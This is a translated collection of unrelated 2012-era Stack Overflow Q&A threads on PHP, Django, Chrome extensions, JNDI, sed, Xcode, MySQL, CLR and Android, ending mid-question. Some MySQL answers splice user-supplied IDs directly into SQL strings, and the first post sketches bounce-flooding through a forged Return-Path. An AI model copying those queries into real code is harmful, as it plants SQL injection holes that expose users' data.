使用 PHP (5.2.17) 和 PEAR (CVS: $Id: Mail.php 294747 2010-02-08 08:18:33Z clockwerx $) 测试返回路径功能。原因：客户端因未发送的消息而被“失败通知”消息淹没。

我的发现：任何使用 PEAR 的人都可以将**任何电子邮件 ID插入到 Header Return-Path 中，并且所有失败通知都会****不受限制**地路由到该路径！看起来有人可以简单地通过产生一系列消息来淹没一个帐户，这些消息1）针对不存在的电子邮件ID，以及2）将“返回路径”设置为他们不幸的目标。

希望我错过了什么吗？

# django - Django 的 Session 模型是否可用于 memcached 会话？

> ID：13076271
> 
> 赞同：0
> 
> 时间：2012-10-25T19:58:35.107
> 
> 标签：django

最近我们从 django 的默认数据库会话切换到 memcached 会话。

我们一直在使用 contrib 会话模型来删除基于 session_key 的会话：[https ://github.com/django/django/blob/master/django/contrib/sessions/models.py](https://github.com/django/django/blob/master/django/contrib/sessions/models.py)

```
Session.objects.get(session_key=key).delete() 
```

一旦我们切换到 memcached 会话，上面的查询就会引发 DoesNotExist 异常。

Django 的 Session 模型是否可用于 memcached 会话？如果是这样，解决方案是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:10:39.090

Django 提供了一个[`django.contrib.sessions.backends.cache`](https://docs.djangoproject.com/en/dev/topics/http/sessions/?from=olddocs#using-cached-sessions)会话后端，只要缓存配置正确，它就可以满足您的需求。

正如您自己所建议的那样，该`Session`模型由`db`后端使用。要使用`cache`后端，您可以执行以下操作（因此您可以继续使用 API 并使代码面向未来）。

```
from django.contrib.sessions.backends.cache import SessionStore
session = SessionStore(session_key)
session.delete() 
```

这就是在[Sessions 中间件](https://github.com/django/django/blob/master/django/contrib/sessions/middleware.py)中完成的方式。
*无论后端如何，此方法都应该有效，如果您决定在未来移动到另一个后端，这可能是一种首选行为。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:58:51.093

```
mc = memcache.Client(settings.CACHE_BACKEND[:-1].split('//')[1].split(';'))
mc.delete(str(key)) 
```

# google-chrome-extension - 如何在 Chrome 扩展弹出窗口中授予 webkitGetUserMedia 权限？

> ID：13076272
> 
> 赞同：14
> 
> 时间：2012-10-25T19:58:37.790
> 
> 标签：google-chrome-extension, webrtc

我已成功使用 webkitGetUserMedia 在普通网页上从我的网络摄像头捕获视频，但是当我尝试在 Chrome 扩展程序的 popup.html 中执行此操作时，没有任何反应。我没有收到任何权限错误，它甚至似乎从来没有问过（inforbar 永远不会在弹出窗口中向下滑动）。有没有办法解决？看起来我不能在清单 json 中授予权限。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-12-09T17:42:08.097

这是一个便宜的黑客，但是如果你为你的扩展创建一个选项页面并`webkitGetUserMedia`在 JS 中包含对它的调用，它将请求该扩展的所有 URI 的权限，在用户在选项页面中允许它之后，背景页面将也有权使用它。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-29T20:55:36.107

**Chrome 扩展和 WebRTC：**

[Chrome 扩展清单权限文档](http://developer.chrome.com/extensions/manifest.html#permissions)没有提到清单中需要的两个权限，“videoCapture”和“audioCapture”，所以我不确定 Chrome 扩展是否可以使用该功能，您应该尝试看看会发生什么在继续之前！;)

**Chrome 打包应用程序和 WebRTC：**

但是，在 Chrome 打包的应用程序中，沙盒和非沙盒页面都是可能的！Chrome 打包应用程序与扩展程序非常相似，因此根据您的操作，您可能想要构建一个应用程序。

在[Packaged Apps Manifest Permissions Documentation](http://developer.chrome.com/apps/declare_permissions.html)中，未明确列出“videoCapture”和“audioCapture”权限，但在示例中进行了演示。

我有一个打包的应用程序，它使用沙盒 HTML 页面来运行 webkitGetUserMedia，它运行良好。这是您在清单中需要的内容：

```
{
  "name": "app name",
  "version": "0.2",
  "manifest_version": 2,
  "minimum_chrome_version": "21",
  "app": {
    "background": {
      "scripts": ["main.js"]
    }
  },
  "icons": {
    /* "128": "icon_128.png" */
  },
  "sandbox": {
    "pages": ["call.htm" ]
  },
  "permissions" : [ "videoCapture", "audioCapture" ]
} 
```

然后，您需要从 chrome://newtab 页面作为应用程序启动弹出窗口。main.js 应该包含如下内容：

```
// Chrome v24+
chrome.app.runtime.onLaunched.addListener(function() {
    chrome.app.window.create('mainpage.html',
        {width: 1190, height: 709});
}); 
```

主页应该是您的弹出窗口。在我的设置中，我在 mainpage.html 中有一个名为 call.htm 的 iframe，并且 iframe 页面是沙盒化的，因此它可以执行一些只能作为普通网页执行的不安全操作。但是，如果我在非沙盒弹出窗口中运行 getUserMedia 命令，我会从对 webkitGetUserMedia 的调用中获取 MediaStream 对象：

```
 navigator.webkitGetUserMedia({ audio: true, video: true },
                function (stream) {
                    mediaStream = stream;
                },
                function (error) {
                    console.error("Error trying to get the stream:: " + error.message);
                }); 
```

我对其进行了测试，并且能够在弹出窗口中捕获我的视频。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-03-29T19:07:58.460

正如@tsbarnes 所建议的，有一个 hack，但对于 Chrome 应用程序，hack 是不同的，你可以调用 navigator.webkitGetUserMedia `background.js`，例如：

```
navigator.webkitGetUserMedia({audio: true, video: true}, function() {
    console.log('ok');
}, function(e) {
    console.log('webcam not ok');
}); 
```

然后您仍然可以从 window.html 或任何其他 webview 访问音频/视频

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-11-21T14:05:21.410

要求`navigator.webkitGetUserMedia`在`options.js`作品中，但您必须`option.html`在新标签中打开弹出窗口，否则您将收到错误，因此`manifest.json`您必须编写

```
"options_ui": {
    "page": "options.html",
    "chrome_style": true,
    "open_in_tab": true
  } 
```

# java - IntialContext 实例化失败

> ID：13076274
> 
> 赞同：1
> 
> 时间：2012-10-25T19:58:43.353
> 
> 标签：java, jakarta-ee, jndi, jboss7.x, java-7

我编写了一个简单的 java 程序来执行与 HornetQ 服务器的远程连接。

```
Properties p = new Properties();
p.put(Context.INITIAL_CONTEXT_FACTORY, "org.jboss.naming.remote.client.InitialContextFactory");
p.put(Context.PROVIDER_URL, "remote://myIP:4447");
p.put(Context.SECURITY_PRINCIPAL, "user");
p.put(Context.SECURITY_CREDENTIALS, "pwd");

final InitialContext iniCtx = new InitialContext(p); 
```

如果 JBoss 服务器关闭， `final InitialContext iniCtx = new InitialContext(p);`语句本身会抛出

```
javax.naming.NamingException: Failed to create remoting connection [Root exception is java.lang.RuntimeException: Operation failed with status WAITING] 
```

这是有效的情况吗，如果 JBoss 服务器（或任何其他应用程序服务器）关闭，实例化 InitialContext 本身应该失败吗？

如果这是有效的情况，

我有另一个独立的应用程序（这不在任何服务器上，独立的 java 应用程序）

在这个独立的应用程序中，我试图创建`IntialContext`与上面完全相同的行。

当 JBoss 服务器关闭时，`InitialContext`实例化不会失败。

对这个 IntialContext 的工作原理完全感到困惑，任何输入都将不胜感激。

**更新：**

是否有任何罐子可能会影响 InitialContext 行为？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-28T07:45:30.243

> 这是有效的情况吗，如果 JBoss 服务器（或任何其他应用程序服务器）关闭，实例化 InitialContext 本身应该失败吗？

是的。

> 如果这是有效的情况，我有另一个独立的应用程序（这不在任何服务器上，独立的 java 应用程序）。在这个独立的应用程序中，我正在尝试创建与上面完全相同的 IntialContext 行。当 JBoss 服务器关闭时，InitialContext 实例化不会失败。

真的。难以置信。它在做什么呢？如果它没有失败，你怎么知道服务器已经关闭？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-30T08:06:05.773

看起来当您`stop`运行服务器并运行时`standalone1`，服务器并没有
停止，而是`transition`因为它确实得到了`initialContext` 但稍后在服务器转换完成时失败。

所以一个问题：你如何停止服务器？杀死进程或一些命令行脚本来停止？使用日食？要不然是啥？

当您停止服务器时，请使用`netstat -a`windows dos 来查看正在侦听的所有端口。Jboss 端口可能仍在侦听。确认端口没有被监听，然后运行你的独立，你应该得到错误`InitialContext`

我想要做的底线就是这样`if this is valid case, I have another standalone app (this is not on any server, standalone java application). Inside this standalone app, I am trying to create IntialContext exact same lines as above. When JBoss server is down, InitialContext instantiation is not failing.`

不是一个有效的案例，不应该发生。

# php - PHP 的 json_decode 无法解码有效的 JSON

> ID：13076277
> 
> 赞同：3
> 
> 时间：2012-10-25T19:58:54.423
> 
> 标签：php, multidimensional-array, json

所以我有这个 JSON 对象：

```
[
    {
        "branch_id": "1",
        "issue_id": "1",
        "user_id": "5",
        "parent_id": null,
        "level": "1",
        "name": "troll",
        "description": "yup",
        "add_date": "2012-10-24 20:26:04",
        "children": [
            {
                "branch_id": "2",
                "issue_id": "1",
                "user_id": "5",
                "parent_id": "1",
                "level": "2",
                "name": "sdad",
                "description": "dssfsd",
                "add_date": "2012-10-24 20:52:52",
                "children": [
                    {
                        "branch_id": "4",
                        "issue_id": "1",
                        "user_id": "5",
                        "parent_id": "2",
                        "level": "3",
                        "name": "fdgffd",
                        "description": "ghjjhjghjj",
                        "add_date": "2012-10-25 17:51:53",
                        "children": []
                    }
                ]
            }
        ]
    },
    {
        "branch_id": "3",
        "issue_id": "1",
        "user_id": "5",
        "parent_id": null,
        "level": "1",
        "name": "dgdfg",
        "description": "dfgfgdfg",
        "add_date": "2012-10-24 20:52:52",
        "children": []
    }
  ] 
```

出于某种原因，当我尝试使用 PHP 的 json_decode 对其进行解码时，它不会输出任何内容。该对象不能无效，因为 JSONLint 和此[解析器](http://json.parser.online.fr/)都正确解析它并且不会引发错误。PHP 自己的 json_last_error 方法也不会抛出任何错误。

我认为不存在的输出可能与具有多维数组的对象有关，但我不确定。你怎么看？

**编辑**

这里有一点背景：

此 JSON 对象是从此[文件](http://skibb.it/api/issues/branches?issue_id=1)中检索的。它来自一个（开发中的）API，这个特定的资源从某个“分支集合”返回一个 JSON 对象。我使用 cUrl 将这个 JSON 对象提取到 PHP，下面是代码：

```
$ch = curl_init('http://skibb.it/api/issues/branches?issue_id=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$branches = curl_exec($ch);
curl_close($ch); 
```

这也应该没有错误，因为它正确地获取了纯 JSON 对象。但是当我尝试时：

```
$branches = json_decode($branches);
var_dump($branches); //Or print_r($branches); 
```

它只是不输出任何东西，除了NULL。

**最终编辑**

是的，这很尴尬。看了下代码发现，我在调试阶段不小心在编码过程中留下了一个print_r()，输出的是JSON对象，**后面是一个数字1**。但是感谢您的回复，他们有助于区分问题的根源！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:02:46.197

您的 JSON 没有任何问题。正如你所说，它解析正确。请注意，当您“解码”时，不会输出任何内容。你仍然需要对它做点什么。不要期望在解码后看到转储。

看这里：

[http://codepad.org/LyRSQNPG](http://codepad.org/LyRSQNPG)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T08:52:26.823

这是一个示例 json 解码。

```
$jsonDayArray    = $_REQUEST['jsonDayArray'];
    $jsonDayArray    = str_replace("\\","",$jsonDayArray);
    $DayArray = array();
    $DayArray = json_decode($jsonDayArray, true); 
```

# pixelsense - 捕获标签可视化器联系事件

> ID：13076280
> 
> 赞同：0
> 
> 时间：2012-10-25T19:59:12.033
> 
> 标签：pixelsense

我正在使用 TagVisualizer 对象开发 Microsoft Surface(pixelsense) 应用程序我正在寻找一种方法来捕获其他 UI 元素（如按钮）上的 tagEnter、tagLeave 事件。例如，在下面的 XAML 代码中，我想在 TagVisualizer 进入“Button1”的边界时捕获一个事件。

```
 <Grid>
    <s:TagVisualizer 
        Name="MaintagVisualizer" VisualizationAdded="MaintagVisualizer_VisualizationAdded" 
        VerticalAlignment="Stretch" 
        HorizontalAlignment="Stretch" 
        HorizontalContentAlignment="Center" 
        Height="Auto" Width="Auto"
        VerticalContentAlignment="Center" >

        <s:TagVisualizer.Definitions>
            <s:TagVisualizationDefinition LostTagTimeout="2000" MaxCount="1" Value="0x1" Source="TagVisualizationEllipse.xaml" />
        </s:TagVisualizer.Definitions>

        <s:SurfaceButton Name="Button1" HorizontalAlignment="Left" VerticalAlignment="Top" Content="test" Width="120" Height="40" Margin="20" ></s:SurfaceButton>

    </s:TagVisualizer>
</Grid> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T00:45:59.353

我知道这是一个旧帖子，但我想我会记录一些东西来帮助别人。

我正在做类似的事情...尝试捕获将标签放置在名为 myMap 的控件上时的触摸事件（向下、向上等）。

这是我开发的解决方案：首先，窗口的触摸侦听器：

```
public SurfaceWindow1()
    {
         Touch.FrameReported += new TouchFrameEventHandler(Touch_FrameReported);
    } 
```

然后处理程序：

```
void Touch_FrameReported(object sender, TouchFrameEventArgs e)
    {

        if (this.myMap != null)
        {
            string active_capture = "";

            foreach (TouchPoint _touchPoint in e.GetTouchPoints(this.myMap))
            {

                if (_touchPoint.TouchDevice.Captured != null)
                {
                    active_capture = _touchPoint.TouchDevice.Captured.ToString();
                }

                if (active_capture.Contains("TagVisualizer"))
                {
                    //This touch was captured by the tag visualizer, therefore it must be a tag
                   if (_touchPoint.Action == TouchAction.Down)
                    {
                        TagTouchId = _touchPoint.TouchDevice.Id;
                        //now you can do whatever you like with the TouchDevice ID
                    }
                }
            }
        }
    } 
```

您可能可以用按钮控件做同样的事情。至少这可以让你开始。

# django - django 无法过滤多个词

> ID：13076292
> 
> 赞同：0
> 
> 时间：2012-10-25T20:00:18.323
> 
> 标签：django, filter, django-views

```
design_list = Design.objects.filter(tags__tag__contains='jewellery') 
```

如果我添加一个过滤器术语（如下），它会返回“关键字参数重复”

```
design_list = Design.objects.filter(tags__tag__contains='jewellery', tags__tag__contains='gadget') 
```

如何添加更多条款？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:03:59.000

您必须使用[`Q`对象](https://docs.djangoproject.com/en/dev/topics/db/queries/#complex-lookups-with-q-objects)才能进行`OR`查询：

```
from django.db.models import Q
Design.objects.filter(Q(tags__tag__contains = "jewellery") | Q(tags__tag__contains = "gadget")) 
```

# regex - 可能需要每行捕获多个表达式的正则表达式 (sed)

> ID：13076294
> 
> 赞同：4
> 
> 时间：2012-10-25T20:00:24.073
> 
> 标签：regex, sed, awk

我正在尝试编写一个正则表达式来捕获文件中的名称，其中某些行可能有 2 个或更多需要捕获的名称。

例如，我想获取一个文件：

```
Field_1 \t Field_2 \t Field_3 \t JGN;Name=hsa-123;J4N9;Name=cfa-241-b
Field_1 \t Field_2 \t Field_3 \t JPN;Name=hsa-1323;JJ39;Name=cfa-255-b;Name=hsa-188 
```

并有一个输出文件返回：

```
Field_1 \t Field_2 \t Field_3 \t hsa-123; cfa-241-b
Field_1 \t Field_2 \t Field_3 \t hsa-1323;cfa-255-b;hsa-188 
```

我正在使用正则表达式如下：

```
sed 's/\(.*\)\t\(.*\)\t\(.*\)\t.*\;Name=\(.*\);.*/\1\t\2\t\3\t\4\;\4/g' 
```

但这只会返回名字。任何建议将不胜感激

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:03:15.240

做

```
sed 's/\([[:space:]]\|;\)[[:alnum:]]*;/\1/g; s/Name=//g' 
```

为你工作？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:28:30.373

```
$ sed -E 's/ [^ ;]+;//; s/;[^=]+;/;/g; s/Name=//g' file
Field_1 \t Field_2 \t Field_3 \thsa-123;cfa-241-b
Field_1 \t Field_2 \t Field_3 \thsa-1323;cfa-255-b;hsa-188 
```

如果您的 sed 不支持 ERE (-E)，则将 [^ ;]+ 更改为 [^ ;][^ ;]* 并将 [^=]+ 更改为 [^=][^=]* 或将 awk 与 [ g]子（）。

# ios - XCode 4.5、Facebook SDK 3.1 实现导致“...所选目标不支持架构...”错误

> ID：13076296
> 
> 赞同：8
> 
> 时间：2012-10-25T20:00:26.457
> 
> 标签：ios, xcode, facebook, sdk, linker

目前收到以下错误：

无法在选定目标上运行

所选目标不支持构建所选软件的体系结构。切换到支持该架构的目的地以运行所选软件

在将新的 Facebook SDK 添加到我的项目（添加框架，将 -lsqlite3.0 添加到我的 Other Linker Flags 构建设置。

我试过重启我的电脑；我已经在另一个应用程序上尝试过（其中一个 facebook 指示您演示登录），无论我做什么，我总是会收到此错误。在 SO 上环顾四周，没有发现任何与我有关的东西。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-31T09:32:02.777

我发现了问题，如果您安装 FacebookSDK 并添加资源文件夹以获取 facebook 图像按钮，则会有一个 Info.plist 文件。这个 info.plist 文件让 XCodes 变得很奇怪。我已将其删除，进行了清理，现在它可以完美运行了:) 最好的选择是将项目移动到其他路径。从 lib 依赖项中添加和删除 libsql3.0 有时也可以。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-23T15:53:40.663

我看到有一些不同的事情导致了这个错误。如前所述，确保构建设置中定义的架构对于项目和您正在使用的任何静态库都是正确的。

导致我多次遇到这种情况的一件事是项目或目标构建设置之一中指定的“产品名称”与目标名称不匹配。

例如：如果您有一个名为“MyProject”的项目并且您有一个名为“SomeTarget”的目标，则在“SomeTarget”的构建设置中，产品名称（在“Packaging”下）必须是“SomeTarget”。如果不是，无论出于何种原因，您都会收到此错误。

我的工作中有一个项目，我们在其上运行一个脚本来更改各种内容，以便我们可以根据需要单独打包应用程序。每当我们向脚本添加新配置时，如果我们不添加更改产品名称的部分，我们每次都会收到此错误。

不知道这是否会对您的特定问题有所帮助，但我想我会提到它以防万一。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-11T18:28:25.670

您是否添加了整个 facebooksdk 文件夹？如果是这样，它有一个 info.plist 文件，删除该文件，你应该没问题。

当项目中有多个 info.plist 文件时，xcode 会感到困惑

# php - 数据库查询以获取每个用户的最后一条消息（如 facebook 消息）

> ID：13076298
> 
> 赞同：6
> 
> 时间：2012-10-25T20:00:38.223
> 
> 标签：php, mysql, message

我需要获取登录用户和他曾经聊天过的任何用户之间的最后一条消息，就像 facebook 一样。这将类似于 facebook.com/messages 页面。这是我到目前为止所做的

**数据库**

user_table
- cwid
- first_name
- last_name
- user_image_link

message
- id
- cwid1 (sender id)
- cwid2 (receiver id)
- message (消息内容)
- messagetime (timestamp)
- userread (enum 'Y' 'N')`

**登录用户的查询** *具有 id =1*

```
SELECT    
user_table.cwid,    
    message.cwid1,   
    message.cwid2,   
    message.message,   
    message.userread,  
    MAX(message.messagetime),   
    user_table.first_name,   
    user_table.last_name,   
    user_table.user_image_link   
    FROM message   
    INNER JOIN user_table   
    ON message.cwid1 = user_table.cwid   
    WHERE (cwid2="1")   
    GROUP BY cwid1   
    ORDER BY messagetime DESC 
```

这将返回用户从所有向他发送消息的人那里收到的最后一条消息。我还需要类似地获取该用户发送的所有消息，可以通过

```
SELECT    
user_table.cwid,   
    message.cwid1,     
    message.cwid2,    
    message.message,   
    message.userread,    
    MAX(message.messagetime),   
    user_table.first_name,    
    user_table.last_name,    
    user_table.user_image_link    
    FROM message    
    INNER JOIN user_table    
    ON message.cwid1 = user_table.cwid   
    WHERE (cwid1="1")    
    GROUP BY cwid2    
    ORDER BY messagetime DESC 
```

我需要它们与不同的用户混合并按消息时间排序，就像 Facebook 消息一样。我是 MySql 的新手，非常感谢任何帮助。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-10-20T10:33:34.603

我做了更多的工作并提出了这个查询。- 它列出来自最近用户的消息，他们向我发送消息或收到我的消息 - 它还包括来自群聊的消息，任何人都可以创建群组，群组中的任何人都可以邀请他们的朋友 - 它还包括已读/未读标记以突出显示前端的未读消息。

这不是最有效或最优雅的查询，但它有效。非常欢迎任何改进

```
SELECT * 
FROM (
 SELECT * 
FROM (

SELECT * 
FROM (

SELECT users.id,'0' AS groupId, users.name,  users.profilePic,  messages.time,messages.message , 'Y' AS unread 
FROM users
INNER JOIN messages ON messages.userId2 = users.id
WHERE messages.userId1 = '" . $userId . "'
UNION 
SELECT users.id,'0' AS groupId, users.name,users.profilePic, messages.time, messages.message , messages.read AS unread
FROM users
INNER JOIN messages ON messages.userId1 = users.id
WHERE messages.userId2 = '" . $userId . "'
) AS allUsers
ORDER BY TIME DESC
) AS allUsersSorted
GROUP BY id
UNION
select * from(
SELECT '0' AS id, msgGroups.id AS groupId, msgGroups.name, msgGroups.image AS profilePic, IF(userGroupMsg.time IS NULL,userGroups.createdOn,userGroupMsg.time )   AS time,IF(userGroupMsg.message IS NULL,'',userGroupMsg.message ), 'Y' AS unread
FROM msgGroups
LEFT JOIN userGroups ON msgGroups.id = userGroups.groupId
LEFT JOIN userGroupMsg ON msgGroups.id = userGroupMsg.groupId
WHERE userGroups.userId = '" . $userId . "'
ORDER BY time DESC

)AS allUsersSorted
GROUP BY groupId

 )AS allSorted
ORDER BY TIME DESC 
```

如果有人可以，请改进。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:51:10.313

也许是这样的：

```
SELECT
  DISTINCT m.id, m.cwid1, m.cwid2, m.message, m.userread, m.messagetime,
  u.first_name, u.last_name, u.user_image_link
FROM
  user_table u,
  message m,
  (
    SELECT DISTINCT IF(cwid1 = "1", cwid2, cwid1) AS id
    FROM message
    WHERE "1" IN (cwid1, cwid2)
  ) partner
WHERE
  u.cwid = partner.id
  AND (m.messagetime, m.cwid1, m.cwid2) IN
    (
      SELECT MAX(messagetime), cwid1, cwid2
      FROM message
      WHERE (cwid1, cwid2) IN ((partner.id,"1"),("1",partner.id))
      GROUP BY cwid1, cwid2
    )
ORDER BY m.messagetime DESC 
```

请注意，`FROM`子句中没有出现在聚合函数中的所有列`MAX` **都必须**出现在`GROUP BY`子句中。MySQL 在这种情况下不会引发错误，但非聚合列中的值是随机的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T01:05:21.267

我会在这里查看 Facebook 如何为消息设置 FQL 表：[https](https://developers.facebook.com/docs/reference/fql/unified_message) ://developers.facebook.com/docs/reference/fql/unified_message 。并以此为基础构建您的表格架构。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-30T14:05:36.173

```
Try this
select m.* ,u.*
            from
                messages m
                inner join (
                select max(id) as maxid
                from messages
                where messages.list_id = " '. $data['list_id'] .'" 
                group By (if(sender_id > reciever_id,  sender_id, reciever_id)), 
                (if(sender_id > reciever_id,  reciever_id, sender_id))
               ) t1 on m.id=t1.maxid 
```

# c++ - 使用 Windows API 的 C++ DirectX 项目的 CLR 包装问题

> ID：13076309
> 
> 赞同：0
> 
> 时间：2012-10-25T20:00:54.417
> 
> 标签：c++, clr

好的，所以我有一个项目，我正在尝试为其创建一个包装器，这将允许我将它与 CLR 一起使用。

我已将我的 DirectX 项目编译为 .lib。当我尝试在我的 CLR 项目中链接它时，我收到以下错误：

```
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__MessageBoxW@16 referenced in function __catch$?SetUpObjects@cMain@@AAE_NXZ$0
1>Renderer Library.lib(cGraphics.obj) : error LNK2001: unresolved external symbol __imp__MessageBoxW@16
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__ShowCursor@4 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__SetFocus@4 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__SetForegroundWindow@4 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__ShowWindow@8 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__CreateWindowExW@48 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__ChangeDisplaySettingsW@8 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__GetSystemMetrics@4 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__RegisterClassExW@4 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__GetStockObject@4 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__LoadCursorW@8 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__LoadIconW@8 referenced in function "private: void __thiscall cMain::InitializeWindows(int &,int &)" (?InitializeWindows@cMain@@AAEXAAH0@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__UnregisterClassW@8 referenced in function "private: void __thiscall cMain::ShutdownWindows(void)" (?ShutdownWindows@cMain@@AAEXXZ)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__DestroyWindow@4 referenced in function "private: void __thiscall cMain::ShutdownWindows(void)" (?ShutdownWindows@cMain@@AAEXXZ)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__DefWindowProcW@16 referenced in function "public: long __stdcall cMain::MessageHandler(struct HWND__ *,unsigned int,unsigned int,long)" (?MessageHandler@cMain@@QAGJPAUHWND__@@IIJ@Z)
1>Renderer Library.lib(cMain.obj) : error LNK2019: unresolved external symbol __imp__PostQuitMessage@4 referenced in function "long __stdcall WndProc(struct HWND__ *,unsigned int,unsigned int,long)" (?WndProc@@YGJPAUHWND__@@IIJ@Z) 
```

我正在尝试创建一个用于渲染的窗口，但我必须调用的所有函数似乎都不起作用。

最终，我想重组我的 DirectX 项目，使我能够以我想要的 CLR 方式使用它。不过目前，我只是想让它玩得更好。问题似乎是我用来创建窗口和初始化我的 DirectX 设备的功能。不太确定如何补救它，无论是我错过了链接器还是我是否应该采用不同的策略。

# android - 列表视图中的 EditText 失去了对输入文本的关注

> ID：13076315
> 
> 赞同：1
> 
> 时间：2012-10-25T20:01:10.047
> 
> 标签：android, android-edittext

在子视图中的 ExpandableListView 上显示 EditText“edName”。用户更改 EditText 中的文本后，需要 a) 更新数据库 b) 在新文本上刷新 ExpandableListView 组文本。

我的想法是 - 完成更改文本后，用户将焦点更改为下一个 View 元素。在 EditText 失去焦点我写入数据库并调用 notifyDataSetChanged();

addTextChangedListener 不适合，需要在一组文本后响应。

```
public View getChildView(int groupPosition, int childPosition, boolean isLastChild, View convertView, android.view.ViewGroup parent) 
{
  View view = super.getChildView(groupPosition, childPosition, isLastChild, convertView, parent);

  final EditText edName = (EditText) view.findViewById(R.id.edName);
  edName.setOnFocusChangeListener(new OnFocusChangeListener() 
  {
    public void onFocusChange(View arg0, boolean focusable) 
    {
      Log.e("Name", "Focusable: " + focusable + " CurValue: " + dataItem.Name + " ETValue: " + edName.getText().toString());
    }
  });
} 
```

在没有 ExpandableListView 的视图上，用户从 EditText 触摸另一个位置后，EditText 失去焦点，但在使用 ExpandableListView 的视图上

群组展开：

```
10-25 22:52:44.390: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyy
10-25 22:52:44.390: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyy 
```

触摸EditText：

```
10-25 22:54:18.072: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyy
10-25 22:54:18.092: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyy
10-25 22:54:18.642: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyy
10-25 22:54:18.662: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyy 
```

输入“u”：

```
10-25 22:54:56.369: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyy
10-25 22:54:56.369: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyy
10-25 22:54:56.399: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyyu
10-25 22:54:56.409: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyyu 
```

输入“我”：

```
10-25 22:56:05.557: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyyu
10-25 22:56:05.567: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyyu
10-25 22:56:05.657: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyyui
10-25 22:56:05.657: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyyui 
```

触摸另一个 EditTest：

```
10-25 22:56:44.605: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyyui
10-25 22:56:44.665: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyyui
10-25 22:56:44.755: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyyui
10-25 22:56:44.755: E/Name(24403): Focusable: true CurValue: tytyy ETValue: tytyyui
10-25 22:56:46.787: E/Name(24403): Focusable: false CurValue: tytyy ETValue: tytyyui 
```

**为什么重心变化这么多？**

**作为另一种确定文本变化的方法？**

# c++ - 如何从地图中的所有值类型中找到最大值？

> ID：13076317
> 
> 赞同：-2
> 
> 时间：2012-10-25T20:01:17.897
> 
